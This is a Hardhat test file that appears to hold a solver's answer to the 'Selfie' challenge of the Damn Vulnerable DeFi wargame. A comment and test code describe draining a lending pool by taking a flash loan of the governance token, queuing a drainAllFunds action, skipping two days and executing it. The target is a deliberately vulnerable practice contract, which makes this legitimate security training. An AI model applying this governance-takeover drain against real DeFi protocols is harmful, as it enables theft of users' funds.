const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Selfie", function () {
  let deployer, attacker;

  const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther("2000000"); // 2 million tokens
  const TOKENS_IN_POOL = ethers.utils.parseEther("1500000"); // 1.5 million tokens

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory(
      "DamnValuableTokenSnapshot",
      deployer
    );
    const SimpleGovernanceFactory = await ethers.getContractFactory(
      "SimpleGovernance",
      deployer
    );
    const SelfiePoolFactory = await ethers.getContractFactory(
      "SelfiePool",
      deployer
    );

    this.token = await DamnValuableTokenSnapshotFactory.deploy(
      TOKEN_INITIAL_SUPPLY
    );
    this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
    this.pool = await SelfiePoolFactory.deploy(
      this.token.address,
      this.governance.address
    );

    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

    expect(await this.token.balanceOf(this.pool.address)).to.be.equal(
      TOKENS_IN_POOL
    );
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */
    /**
     * It's really silly to apply governance on a contract that uses the same
     * asset to give flashloans. You can ask for a flashLoan at max. cap., and
     * then queue an action that all funds must be drained to the attacker address.
     * Wait for 2 days and that would be it.
     *
     * 1. Create a contract receiver.
     * 2. Ask for a flashloan.
     * 3. ReceiveTokens and take a snapshot, since it's a public function.
     * 4. queue an action to drainAllFunds to attacker.address.
     * 5. Return tokens.
     * 6. Wait 2 days.
     * 7. Profit
     */

    const ExploitSelfieFactory = await ethers.getContractFactory(
      "ExploitSelfie",
      attacker
    );
    const exploitSelfie = await ExploitSelfieFactory.deploy(
      this.pool.address,
      this.governance.address,
      this.token.address
    );
    
    await exploitSelfie.flashLoan();
    // 2 days
    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);

    let actionExploitId = await exploitSelfie.getExploitActionId();
    this.governance = this.governance.connect(attacker);
    this.governance.executeAction(actionExploitId);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker has taken all tokens from the pool
    expect(await this.token.balanceOf(attacker.address)).to.be.equal(
      TOKENS_IN_POOL
    );
    expect(await this.token.balanceOf(this.pool.address)).to.be.equal("0");
  });
});
